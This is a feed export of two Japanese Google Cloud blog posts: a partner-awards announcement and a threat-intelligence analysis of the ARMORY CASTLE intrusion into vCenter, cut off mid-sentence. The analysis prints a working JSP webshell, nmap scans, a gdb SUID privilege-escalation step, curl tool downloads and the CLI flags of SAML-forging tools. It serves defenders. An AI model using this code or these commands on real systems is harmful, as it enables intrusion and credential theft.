  "42c6ed607a08de757540facc94b42b8c":
    "id": "42c6ed607a08de757540facc94b42b8c"
    "title": "2026 年 Google Cloud Partner All-stars の受賞者を表彰"
    "link": "https://cloud.google.com/blog/ja/topics/partners/2026-google-cloud-partner-all-stars-winners/"
    "published": "2026-11-20 11:30:00"
    "fetched": "2026-11-20 19:55:50"
    "summary": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">※この投稿は米国時間 2026 年 11 月 18 日に、Google Cloud blog に</span><a href=\"https://cloud.google.com/blog/topics/partners/2026-google-cloud-partner-all-stars-winners?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">投稿</span></a><span style=\"vertical-align: baseline;\">されたものの抄訳です。</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Cloud パートナー エコシステムは、カスタマー サクセスの推進において重要な役割を果たしています。変革の新しい時代を迎えるなか、AI を初期の試験運用から本格的な本番環境レベルのデプロイへと移行させるうえで、パートナーの皆様は欠かせない存在となっています。この移行を成功させるには、テクノロジーだけでは不十分です。必要なのは、ワークフローを見直し、組織の変革を導き、確実な成果をもたらすことのできる熟練した実務担当者です。あらゆる業界や地域で展開する Google Cloud のパートナー エコシステムが、この変革を推し進めています。</span></p>\n<p><span style=\"vertical-align: baseline;\">毎年年末には、お客様のために常に期待を上回る貢献を重ねている Partner All-stars の受賞者を、感謝と敬意を込めて表彰しています。Google Cloud Partner All-stars プログラムは、次の 5 つの専門分野で優れた功績を残した方々を称えるものです。</span></p>\n<p><strong style=\"vertical-align: baseline;\">AI リーダーシップ（2026 年新設）<br /></strong><span style=\"vertical-align: baseline;\">AI リーダーシップ All-stars は、AI を活用した働き方への移行を先導する、信頼できるエキスパートです。企業が自社の業務を根本から全面的に見直せるよう支援しています。全社的な変革を先導することで、組織がスムーズに変化へ適応し、イノベーションを起こし、新しいツールを定着させられる環境を整えています。</span></p>\n<p><strong style=\"vertical-align: baseline;\">セールス<br /></strong><span style=\"vertical-align: baseline;\">今年のセールス All-stars は、お客様の変革の最前線に立っています。お客様の変革の道のりを支える Google Cloud のコミットメントを自ら体現し、営業目標を常に上回る成果を上げながら、一貫して素晴らしいカスタマー エクスペリエンスを提供しています。短期的な売上よりもお客様との長期的な信頼関係を優先し、費用対効果の創出を支援しています。</span></p>\n<p><strong style=\"vertical-align: baseline;\">マーケティング<br /></strong><span style=\"vertical-align: baseline;\">マーケティング All-stars は、お客様が抱える深刻な課題や最優先事項に応える戦略的プログラムやキーイベントを牽引するリーダーです。部門横断型チームと連携し、さまざまなキャンペーンやイベントを確実に成功へと導いています。データドリブンなマーケティング手法を実践し、最も大きな効果が見込めるプログラムへ集中してリソースと時間を投資しています。探求心と革新的な視点を持ち、今後の業務をより良くするための機会を常に模索しています。</span></p>\n<p><strong style=\"vertical-align: baseline;\">ソリューション エンジニアリング<br /></strong><span style=\"vertical-align: baseline;\">今年のソリューション エンジニアリング All-stars は、2026 年を通じて極めて優れたカスタマー エクスペリエンスを提供しました。お客様の複雑な課題に革新的な方法で対応すべく、提案から構築までのエンドツーエンドなソリューションに責任を持ち、複数のプロダクト分野にわたって深く連携しています。常に専門スキルを磨き、Google の有効な技術認定資格を維持しながら、この高い水準を保ち続けています。</span></p>\n<p><strong style=\"vertical-align: baseline;\">デリバリー エクセレンス<br /></strong><span style=\"vertical-align: baseline;\">デリバリー エクセレンス All-stars は、Google Cloud の Delivery Readiness プログラムにおいて極めて優れた実績を上げた技術実務者です。高度なデリバリー スキルバッジの取得にとどまらず、お客様のプロジェクトを成功に導くことで、現場における高度な専門性を証明しています。Google Cloud の迅速なデリバリー手法を取り入れることで、安全な移行を加速させ、4〜6 週間単位の反復型 AI スプリントを実行し、検証済みの本番環境デプロイを確実に実現しています。</span></p>\n<p><strong style=\"vertical-align: baseline;\">2026 年の優れた功績を称えて<br /></strong><span style=\"vertical-align: baseline;\">Google Cloud のエコシステムは、優秀な人材が集う、数々の卓越した組織によって支えられています。Google Cloud を代表して、2026 年の Partner All-stars 受賞者の皆様に、心からの祝福と感謝を申し上げます。皆様の優れた技術的専門性、戦略的リーダーシップ、そしてお客様の成功に対するコミットメントこそが、Google Cloud のグローバル パートナー ネットワーク全体における指針となっています。</span></p>\n<p><span style=\"vertical-align: baseline;\">今年の受賞者一覧は、ソーシャル メディアで #PartnerAllstars を検索してご覧いただけます。エンタープライズ クラウドと AI の未来を形作るリーダーの皆様を、ぜひ一緒にお祝いしましょう。</span></p>\n<p><span style=\"vertical-align: baseline;\">詳細については、</span><a href=\"https://cloud.google.com/partners\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud パートナー</span></a><span style=\"vertical-align: baseline;\">のページをご覧ください。</span></p></div>"
  "117ab740c7199843f8d22214cd5a2ff5":
    "id": "117ab740c7199843f8d22214cd5a2ff5"
    "title": "ARMORY CASTLE が vSphere の脆弱性を悪用"
    "link": "https://cloud.google.com/blog/ja/topics/threat-intelligence/armory-castle-exploits-vsphere/"
    "published": "2026-11-20 11:00:00"
    "fetched": "2026-11-20 19:55:50"
    "summary": "<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">はじめに</strong></h3>\n<p><span style=\"vertical-align: baseline;\">2026 年 10 月 15 日、Mandiant と Google Threat Intelligence Group（GTIG）は、中国との関連が疑われる脅威アクター ARMORY CASTLE（旧 UNC5221）が BeyondTrust Remote Support のゼロデイ脆弱性（CVE-2026-102764、</span><a href=\"https://www.beyondtrust.com/trust-center/security-advisories/bt26-05\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BT26-05</span></a><span style=\"vertical-align: baseline;\"> でパッチ適用済み）を悪用した最近の活動を詳細に記載したブログ記事を</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-beyondtrust\"><span style=\"text-decoration: underline; vertical-align: baseline;\">公開</span></a><span style=\"vertical-align: baseline;\">しました。また、この脅威アクターによる侵害後の攻撃運用についても解説しました。本ブログ記事では、VMware vCenter の脆弱性悪用と追加のマルウェア ファミリーの展開を伴う、さらなる侵害後活動について解説します。</span></p>\n<p><span style=\"vertical-align: baseline;\">2026 年 11 月 </span><span style=\"vertical-align: baseline;\">19</span><span style=\"vertical-align: baseline;\"> 日、VMware は VMware vCenter Server 展開環境に影響を与える CVE-2026-123890 を公開しました。</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vsphere-active-directory-integration-risks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vSphere</span></a><span style=\"vertical-align: baseline;\"> は、ハイパーバイザーである ESXi と、管理プラットフォームである vCenter Server で構成されています。vCenter Server は Photon Linux 仮想アプライアンスとして展開される集中管理プラットフォームであり、ESXi ホスト環境の設定、制御、監視に使用されます。CVE-2026-123890 は、Distributed Computing Environment / Remote Procedure Call（DCE/RPC）を介した非認証の Secure Remote Password（SRP-6a）セッション キー開示の脆弱性です。攻撃の実行に成功すると、リモート認証バイパスが発生し、</span><code style=\"vertical-align: baseline;\">administrator@vsphere.local</code><span style=\"vertical-align: baseline;\"> として認証済みセッションが確立されます。攻撃者はこの認証済み管理者セッションを使用して、vCenter Server Directory Service（</span><code style=\"vertical-align: baseline;\">vmdird</code><span style=\"vertical-align: baseline;\">）RPC インターフェースである </span><code style=\"vertical-align: baseline;\">vmdirdbcp</code><span style=\"vertical-align: baseline;\"> を利用し、任意コマンドの実行や data.mdb データベースを含むファイルの取得を行うことが可能になります。影響を受ける組織に対し、Broadcom が提供するセキュリティ </span><a href=\"https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/39495\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">パッチ</span></a><span style=\"vertical-align: baseline;\"> を速やかに適用して本脆弱性を修正することを強く推奨します。</span><span style=\"vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">デジタル フォレンジック調査の証拠によると、ARMORY CASTLE は 2026 年 9 月初旬に BONESAW を使用してこの脆弱性を悪用しました。BONESAW は主にリモート攻撃を容易にするために作られた Go 言語（Golang） ユーティリティであり、CVE-2026-123890 を利用して任意の Lightning Memory-Mapped Database（LMDB）を窃取し、SAML Security Token Service（STS）をハイジャックして、Single Sign-On（SSO）管理者アカウントを作成します。</span></p>\n<p><span style=\"vertical-align: baseline;\">ARMORY CASTLE による BONESAW の使用は、この脅威アクターの侵害後の戦術に関する重要かつ新たな知見となります。今回のキャンペーンで、ARMORY CASTLE は 2 つのゼロデイ脆弱性を悪用し、標的デバイスでのオペレーション専用にカスタマイズされた 3 種類のマルウェア セットを展開しました。これは、深いプラットフォーム専門知識と豊富なリソースによる支援を示しています。防衛者がこの脅威を検出できるよう、本分析および緩和・ハードニングガイドを公表します。</span></p>\n<h3><strong style=\"vertical-align: baseline;\">脅威の詳細</strong></h3>\n<p><span style=\"vertical-align: baseline;\">ARMORY CASTLE は、BeyondTrust デバイスからラテラル ムーブメント（水平展開）を行い、内部 Linux アプライアンス上に足場を確立して root に権限昇格し、アクセス拡大、永続化、vCenter の標的化を支援する一連のマルウェアを配置しました。ARMORY CASTLE はゼロデイ脆弱性を悪用して VMware サーバーへのアクセスを獲得し、この環境向けにカスタマイズされた追加のマルウェア セットを使用して、偵察、認証情報窃取、データ窃取を行った可能性が高いと考えられます。</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"ARMORY CASTLE lateral movement and vCenter compromise sequence of events\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_ARMORY_CASTLE_lateral_movement_an.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>図 1: ARMORY CASTLE のラテラル ムーブメントおよび vCenter 侵害の侵入プロセス</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">ラテラル ムーブメント</span></h4>\n<p><span style=\"vertical-align: baseline;\">BeyondTrust アプライアンス上での永続化確立とラテラル ムーブメント機能の展開に続き、Mandiant は ARMORY CASTLE が内部偵察を実施しているのを観察しました。ARMORY CASTLE がスキャンした特定のポートや、/sdk や /ui などの訪問した URI に基づくと、この偵察は VMware システムに極めて重点が置かれていました。攻撃グループは nmap を利用して、VMware に固有のオープン ポート（具体的にはポート 9080、5480、2012）を実行しているシステムがないか内部環境をスキャンしました。特にポート 2012 は、vCenter Single Sign-On（SSO）の制御インターフェース RPC として使用されており、BONESAW を通じた CVE-2026-123890 のリモート悪用における不可欠な部分となっています。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>/usr/sbin/nmap -sS -p 443,2012,389 --open &lt;REDACTED&gt;.0/24\n/usr/sbin/nmap -sS -p 443,2012,5480 --open &lt;REDACTED&gt;.0/24\n/usr/sbin/nmap -sS -p 443,9080 --open &lt;REDACTED&gt;.0/24\n/usr/sbin/nmap -sS -p 9080,2012 --open &lt;REDACTED&gt;.0/24\n/usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open &lt;REDACTED&gt;.0/24</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">図 2: ARMORY CASTLE による nmap ポート スキャン</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">ARMORY CASTLE は、Endpoint Detection and Response（EDR）ツールが導入されていない環境内の Linux アプライアンスへ横展開しました。ARMORY CASTLE は、新しく特定された 5 つのマルウェア ファミリーおよびユーティリティ（SLIMSAVAGE および CAGEMATCH ウェブシェル、BEARBONES バックドア、リモート悪用ユーティリティ BONESAW、SAWSNAKE SAML ユーティリティ）を展開しました。また、ARMORY CASTLE は LAZYBONES バックドアも使用しました。これについては Mandiant と GTIG が以前に別の ARMORY CASTLE 侵入事案と関連付けて発表しています。</span></p>\n<h4><span style=\"vertical-align: baseline;\">足場の確立</span></h4>\n<p><span style=\"vertical-align: baseline;\">最初の Linux アプライアンス上に足場を確立するため、攻撃者は </span><code style=\"vertical-align: baseline;\">ActiveSer.jsp</code><span style=\"vertical-align: baseline;\"> というウェブシェルを設置しました（Mandiant はこれを SLIMSAVAGE として追跡）。SLIMSAVAGE は、認証シークレット </span><code style=\"vertical-align: baseline;\">pwd=123</code><span style=\"vertical-align: baseline;\"> を使用する高度なコマンド実行ウェブシェルとして機能します。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>if(\"123\".equals(request.getParameter(\"pwd\"))){\n  try{\n    ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\",\"-c\",request.getParameter(\"i\"));\n    Process p = pb.start();\n    InputStream a = p.getInputStream(), b = p.getErrorStream();\n    int c; byte[] d = new byte[2048];\n    out.print(\"&lt;pre&gt;\");\n    while((c=a.read(d))!=-1){out.print(new String(d,0,c));}\n    while((c=b.read(d))!=-1){out.print(new String(d,0,c));}\n    out.print(\"&lt;/pre&gt;\");\n    out.print(\"\\nEXIT:\"+p.waitFor());\n  }catch(Exception e){out.print(\"ERR:\"+e);}\n}</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">図 3: SLIMSAVAGE ウェブシェル</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><code style=\"vertical-align: baseline;\">ProcessBuilder(\"/bin/sh\", \"-c\", ...)</code><span style=\"vertical-align: baseline;\"> を利用することで、SLIMSAVAGE ウェブシェルはコマンドライン インタプリタ内でコマンドを実行し、シェル パイプライン、リダイレクト、環境変数の作成、およびチェーン実行を可能にしました。このウェブシェルは標準出力（</span><code style=\"vertical-align: baseline;\">getInputStream()</code><span style=\"vertical-align: baseline;\">）と標準エラー（</span><code style=\"vertical-align: baseline;\">getErrorStream()</code><span style=\"vertical-align: baseline;\">）の両方から読み取りを行い、完全な診断視認性を確保します。また、</span><code style=\"vertical-align: baseline;\">Process.waitFor()</code><span style=\"vertical-align: baseline;\"> を呼び出して最終的なプロセスのリターン コード（</span><code style=\"vertical-align: baseline;\">\\nEXIT:&lt;code&gt;</code><span style=\"vertical-align: baseline;\">）を付加します。</span></p>\n<p><span style=\"vertical-align: baseline;\">およそ 4 時間後、ARMORY CASTLE は追加のウェブシェル </span><code style=\"vertical-align: baseline;\">u.jsp</code><span style=\"vertical-align: baseline;\">（CAGEMATCH として追跡）を Linux アプライアンスに展開しました。SLIMSAVAGE はアプライアンス上でコマンドを実行する堅牢な機能をグループに提供したものの、データ転送の機能には制限がありました。この課題を解決するため、CAGEMATCH は専用のペイロード ステージング ウェブシェルとして機能します。このウェブシェルは </span><code style=\"vertical-align: baseline;\">multipart/form-data</code><span style=\"vertical-align: baseline;\"> リクエスト ヘッダーを確認し、バウンダリ デリミタを解析して、元のファイル名とともに生のファイル バイトを抽出します。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>File f = new File(\"/tmp\");\nf.mkdirs();\nFile fout = new File(f, fname);\ntry(FileOutputStream fos = new FileOutputStream(fout)){\n    fos.write(fd);\n}\nm = fout.getAbsolutePath();</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">図 4: CAGEMATCH ファイル ステージング ロジック</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">CAGEMATCH は必要に応じて </span><code style=\"vertical-align: baseline;\">/tmp</code><span style=\"vertical-align: baseline;\"> ディレクトリを作成し、アップロードされたペイロードを </span><code style=\"vertical-align: baseline;\">/tmp/&lt;filename&gt;</code><span style=\"vertical-align: baseline;\"> に直接保存して、絶対ターゲット パスをクライアントに返します。アップロード ペイロードなしでアクセスされた場合、最小限の HTML アップロード フォームを返します。これにより、BeyondTrust アプライアンスから直接バイナリ ペイロード、スクリプト、またはツールを </span><code style=\"vertical-align: baseline;\">/tmp</code><span style=\"vertical-align: baseline;\"> にアップロードし、続いて SLIMSAVAGE を呼び出して実行権限を調整しステージングされたツールを実行するという、合理化された侵害後ワークフローが攻撃者に提供されます。</span></p>\n<h2><span style=\"vertical-align: baseline;\">権限昇格</span></h2>\n<p><span style=\"vertical-align: baseline;\">Linux アプライアンス上で root 権限に昇格するため、ARMORY CASTLE は </span><code style=\"vertical-align: baseline;\">/bin/env</code><span style=\"vertical-align: baseline;\"> バイナリに対する Set User ID（SUID）権限の有効化を通じて、BeyondTrust リモート サポート アプライアンスで使用したのと同じ権限昇格手法を繰り返しました。ARMORY CASTLE は GNU Debugger（gdb）を使用してこの権限変更を実行しました。</span><code style=\"vertical-align: baseline;\">/bin/env</code><span style=\"vertical-align: baseline;\"> バイナリで SUID 権限を有効にすることで、任意のユーザーが root としてコマンドを実行できるようになります。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>/bin/sh -c echo IWNobW9kIHUrcyAvYmluL2VudgpxCg==|base64 -d &gt; /tmp/gdb_file\n\n/usr/bin/gdb -pid 113757 --command=/tmp/gdb_file</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">図 5: ARMORY CASTLE による gdb 権限昇格</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">ラテラルムーブメント（追加の攻撃展開）</span></h4>\n<p><span style=\"vertical-align: baseline;\">root 権限への昇格に成功した後、ARMORY CASTLE は環境内でのラテラル ムーブメントを可能にするため、Linux アプライアンス上に追加ツールの配置（ステージング）を開始しました。ARMORY CASTLE は curl を使用して、BeyondTrust アプライアンスから RAR ユーティリティをダウンロードしました。</span></p>\n<pre class=\"language-markup\"><code>curl -o /tmp/rar -k https://&lt;REDACTED&gt;/content/r.js</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">図 6: ARMORY CASTLE によるステージングされた RAR ユーティリティのダウンロード</span></p>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"> </span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">その後、ARMORY CASTLE は curl を使用して RAR アーカイブ </span><code style=\"vertical-align: baseline;\">123.rar</code><span style=\"vertical-align: baseline;\"> をダウンロードし、ダウンロードした RAR バイナリを使用して解凍しました。</span></p>\n<pre class=\"language-markup\"><code>curl -o /tmp/123.rar -k https://&lt;REDACTED&gt;/content/r.js ./rar x -p&lt;REDACTED&gt; 123.rar</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">図 7: ARMORY CASTLE による BONESAW の展開</span></p>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"> </span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">BONESAW として追跡されている </span><code style=\"vertical-align: baseline;\">/tmp/123</code><span style=\"vertical-align: baseline;\"> は、vCenter の CVE-2026-123890 を悪用してリモートでの任意 LMDB 漏洩、SAML STS ハイジャック、および SSO 管理者アカウント作成を可能にする Go 言語 のリモート攻撃ユーティリティです。Mandiant は、ARMORY CASTLE がこのユーティリティを利用して内部 vCenter サーバーを標的にし、SSO 管理者アカウントの作成、および LMDB の持ち出しと解析に成功してサーバーへのラテラル ムーブメントを可能にしたのを確認しました。</span></p>\n<p><span style=\"vertical-align: baseline;\">BONESAW は、CVE-2026-123890 の悪用を通じて、vCenter Server 7.x および 8.x アプライアンスに対するシステム完全侵害を達成します。この脆弱性は、ポート 2012 上の VMware の rpc_srp_verifier サービスにおける暗号ロジックおよび認可の欠陥を悪用し、administrator@vsphere.local として認証済みセッションを作成するために使用できる共有セッション キーを露出させます。また、BONESAW は、オフライン解析のために生の基礎となる LMDB ファイルをストリーミングする機能、VMware Security Token Service（STS）SAML RSA 秘密署名キーを抽出する機能、vmdir を介してバックドア マシン アカウントを作成する機能、管理者 SAML 2.0 アサーション トークンを偽造する機能、および vSphere SOAP API を介して vCenter ルート フォルダにグローバル管理者権限を割り当てる機能を提供します。</span></p>\n<p><span style=\"vertical-align: baseline;\">CVE-2026-123890 は </span><a href=\"https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/38017\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CVE-2026-59309</span></a><span style=\"vertical-align: baseline;\"> と一部重複（主にパスワードを知ることなく共有セッション キー「K」を取得する点）していますが、両者の間にはいくつかの主要な違いが存在します。CVE-2026-59309 は、TCP ポート 389 または 636 へのネットワーク アクセスを持つリモートの未認証の攻撃者が、不正に作成された認証トークンを含むクラフトされた LDAP パケットを送信し、認証をバイパスして管理者セッションを偽造し、vSphere ディレクトリに不正な Single Sign-On（SSO）アカウントを作成できる vCenter Server vmdir デーモンの欠陥です。一方、CVE-2026-123890 は、SRP 認証インターフェースにおける予測可能な UUIDv1 タイムスタンプ生成を悪用することにより、非認証で Secure Remote Password セッション キーが開示される vmdir DCE/RPC インターフェースの欠陥であり、パスワードを知ることなく SRP セッション キーの侵害を可能にします。</span></p>\n<p><span style=\"vertical-align: baseline;\">Mandiant は、2026 年 7 月 29 日の CVE-2026-59309 公開以前に ARMORY CASTLE が CVE-2026-123890 の知識を有していた証拠を保持しています。ログによると、BONESAW は 2026 年 9 月初旬に CVE-2026-59309 に対して既にパッチ適用済みの vCenter サーバーに対して実行されており、回収された Go バイナリには </span><code style=\"vertical-align: baseline;\">2026-07-13T09:21:24Z</code><span style=\"vertical-align: baseline;\">（CVE-2026-59309 が公開される 16 日前）のビルド タイムスタンプが含まれていました（ただし、Go ビルド メタデータはコンパイル前に変更可能です）。</span></p>\n<p><span style=\"vertical-align: baseline;\">ARMORY CASTLE は BONESAW に </span><code style=\"vertical-align: baseline;\">vcenter-db-teamcheck-go</code><span style=\"vertical-align: baseline;\"> と命名しており、Go 言語ビルド アーティファクト </span><code style=\"vertical-align: baseline;\">E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/</code><span style=\"vertical-align: baseline;\"> に基づくと Windows 開発環境からコンパイルされていました。BONESAW は複数のコマンドライン引数をサポートしており、主な機能は「SSO 管理者アカウントをリモートで作成する」機能を提供する CSA コマンドを中心に構成されています。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>Subcommand csa (\"Create SSO admin with minimal parameters\"):\n      • Loads embedded default configuration template and parses CLI flags:\n          • -h: Target vCenter address or vim25 SOAP endpoint (required).\n          • -u: Username for the new SSO admin account (required).\n          • -p: Password for the new SSO admin account (required).\n          • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local).\n          • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local).\n          • -mdb-path: Path to an existing data.mdb file to skip remote database download.\n          • -check-version: Probe target version and connectivity before executing the exploit chain.\n          • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds).</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">図 8: BONESAW コマンドライン引数</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">CSA コマンドライン フラグを使用して実行された場合、BONESAW はディスク上に以下のファイルを作成します:</span></p>\n<pre class=\"language-markup\"><code>&lt;output_root&gt;/temp/extracted_tenant_signer_&lt;sanitized_host&gt;/anon_&lt;sanitized_host&gt;_data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb)\n&lt;output_root&gt;/temp/extracted_tenant_signer_&lt;sanitized_host&gt;/&lt;tenant&gt;-tenantcredential-&lt;N&gt;.key.pem (Extracted RSA private key in PEM format)\n&lt;output_root&gt;/temp/extracted_tenant_signer_&lt;sanitized_host&gt;/&lt;tenant&gt;-tenantcredential-&lt;N&gt;.key.der (Extracted RSA private key in DER format)\n&lt;output_root&gt;/temp/extracted_tenant_signer_&lt;sanitized_host&gt;/&lt;tenant&gt;-tenantcredential-&lt;N&gt;.leaf.pem (Extracted leaf X.509 signing certificate)\n&lt;output_root&gt;/temp/extracted_tenant_signer_&lt;sanitized_host&gt;/&lt;tenant&gt;-tenantcredential-&lt;N&gt;.chain.pem (Extracted X.509 certificate chain)\n&lt;output_root&gt;/temp/extracted_tenant_signer_&lt;sanitized_host&gt;/&lt;tenant&gt;-tenantcredential-&lt;N&gt;.context.json (Target SSO and signer metadata)</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">図 9: BONESAW ファイルシステム アーティファクト</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">BONESAW の実行成功からまもなく、ARMORY CASTLE は追加のユーティリティ </span><code style=\"vertical-align: baseline;\">/tmp/sss</code><span style=\"vertical-align: baseline;\">（SAWSNAKE として追跡）を Linux アプライアンスに配置・展開しました。SAWSNAKE は、vCenter SAML 認証バイパスおよびセッション クッキー生成を可能にする Go 言語製のユーティリティであり、最終的に BONESAW の実行成功後に ARMORY CASTLE が vCenter に対して Golden SAML 攻撃を実施できるようにします。これにより、脅威アクターは認証トークンを偽造し、MFA をバイパスして任意のユーザーになりすますことが可能になります。SAWSNAKE のコア機能は、</span><a href=\"https://github.com/horizon3ai/vcenter_saml_login/blob/main/vcenter_saml_login.py\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vcenter_saml_login.py</span></a><span style=\"vertical-align: baseline;\"> の Python ベースの vCenter SAML ログイン ツールを独自に Go 移植したものです。SAWSNAKE は、vCenter data.mdb データベースから Identity Provider（IdP）署名キーと信頼された証明書を抽出する機能、抽出された認証情報をディスク上の PEM ファイルにエクスポートする機能、Administrator アカウント用の SAML 2.0 アサーションを偽造・署名する機能、およびターゲット vCenter サーバーに認証して管理者セッション クッキーを取得する機能を提供します。</span></p>\n<p><span style=\"vertical-align: baseline;\">SAWSNAKE はコマンドライン引数を解析して動作モードを決定し、以下のコマンドライン引数をサポートします:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>-h, --help  - show this help message and exit\n-p, --path PATH  - Path to the data.mdb file (extract mode)\n-t, --target TARGET  - The IP address of the target vCenter\n-k, --key KEY - IdP private key PEM file (direct-cert mode)\n-c, --cert CERTS  - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks.\n--domain DOMAIN - SSO domain (default: parse from certificate subject DC=)\n--hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate)\n-e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit.\n-v, --verbose - Print extracted/loaded certificates</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">図 10: SAWSNAKE コマンドライン引数</span></p>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"> </span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">SAWSNAKE はディスク上に以下のファイルを作成します:</span></p>\n<pre class=\"language-markup\"><code>&lt;export_dir&gt;/idp_key.pem\n&lt;export_dir&gt;/trusted_cert_2.pem\n&lt;export_dir&gt;/domain.txt</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">図 11: SAWSNAKE によって作成されたファイル</span></p>\n<p style=\"text-align: center;\"> </p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Mandiant は、更新バージョンと疑われる SAWSNAKE の 2 番目のサンプルを特定しました。このサンプルには、すべての TLS、HTTP、SAML 開始、XML 署名、およびログイン ルーチンにわたって標準出力にデバッグ メッセージを出力するより堅牢なデバッグ ログが含まれており、最大 10 回の HTTP 302 リダイレクトをサポートするように拡張されたログイン リダイレクト処理を備え、マルチホップ環境でのツールの利用を可能にしていました。以前の活動と同様に、ARMORY CASTLE は rm を使用して SAWSNAKE およびディスク上に作成されたファイルを削除しているのが観察されました。</span></p>\n<p><span style=\"vertical-align: baseline;\">SAWSNAKE の展開直後、ARMORY CASTLE は追加のバックドア </span><code style=\"vertical-align: baseline;\">/tmp/dbr</code><span style=\"vertical-align: baseline;\">（BEARBONES として追跡）を活用しました。BEARBONES は C 言語で記述されており、オープンソースの Dropbear SSH Server に基づいています。パスワードベースの認証を使用する際にシステム パスワード認証をバイパスし、プレーンテキストの認証情報を記録し、デフォルトのディレクトリ </span><code style=\"vertical-align: baseline;\">/etc/dropbear</code><span style=\"vertical-align: baseline;\"> ではなく </span><code style=\"vertical-align: baseline;\">/tmp</code><span style=\"vertical-align: baseline;\"> からサーバー ホスト キーを読み込むか生成する機能を備えています。パケット タイプ </span><code style=\"vertical-align: baseline;\">SSH_MSG_USERAUTH_REQUEST</code><span style=\"vertical-align: baseline;\"> の認証ハンドラ </span><code style=\"vertical-align: 